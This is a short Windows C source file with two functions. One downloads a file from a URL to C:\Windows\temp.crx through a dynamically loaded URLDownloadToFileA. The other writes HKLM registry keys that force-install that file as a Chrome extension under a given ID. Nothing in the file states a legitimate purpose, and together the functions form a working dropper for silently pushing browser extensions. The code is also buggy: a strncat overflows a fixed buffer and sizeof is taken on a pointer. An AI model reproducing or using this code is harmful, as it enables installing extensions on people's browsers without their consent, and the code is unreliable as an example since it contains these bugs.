#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <tchar.h>
#include <stdio.h>

#ifdef _UNICODE
#  define _tcout wcout
#else
#  define _tcout cout
#endif // _UNICODE

typedef HRESULT (WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB);

void DownFile(LPCTSTR url)
{
	lpURLDownloadToFile URLDownloadToFile;
	  
	HMODULE hUrlmon = LoadLibrary("URLMON.DLL");
	  
	if(hUrlmon == NULL)
	{
	MessageBox(0,"Failed to load URLMON.dll","Error",MB_OK);
	}
	  
	URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");
	  
	if(URLDownloadToFile == NULL)
	{
	MessageBox(0,"Failed to get the address of URLDownloadToFile","Error",MB_OK);
	}
	URLDownloadToFile(0, url, "C:\\Windows\\temp.crx", 0, 0);	
}

int AddReg(LPCTSTR szVER, LPCTSTR szID)
{
	//char szVER[] = "1.6";
	//char szID[] = "ggbmjahbkbhakkfgjiggdclpmmpmhajn";
	char szRegBase[] = "SOFTWARE\\WOW6432Node\\Google\\Chrome\\Extensions\\";
	char szPC[] = "C:\\Windows\\temp.crx";
	
	char* szPath = strncat(szRegBase, szID, 32);
	
	
	HKEY hKey;

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T(szPath), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

	RegSetValueEx(hKey, _T("version"), 0, REG_SZ, (BYTE*)_T(szVER), sizeof(szVER));
	
	RegSetValueEx (hKey, _T("path"), 0, REG_SZ, (BYTE*)_T("C:\\Windows\\temp.crx"), sizeof("C:\\Windows\\temp.crx"));

	RegCloseKey(hKey);
	
	return 0;
}
 
 
				
